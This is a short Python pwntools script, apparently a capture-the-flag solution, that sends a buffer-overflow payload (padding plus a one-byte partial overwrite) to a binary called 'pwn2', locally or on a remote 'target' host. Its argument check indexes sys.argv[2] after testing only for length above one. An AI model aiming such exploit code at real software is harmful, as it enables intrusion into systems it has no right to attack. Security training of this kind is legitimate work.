from pwn import *

context(os="linux", arch="i386")
context.log_level = "debug"

HOST = "target"
PORT = 8080
conn = None

if len(sys.argv) > 1 and sys.argv[2] == "r":
    conn = remote(HOST, PORT)
else:
    conn = process("./pwn2")

payload=b"A"*(0x2a-0x0c)
payload+=p8(0xd8)
conn.recvuntil("call?")
conn.sendline(payload)
conn.recvall()
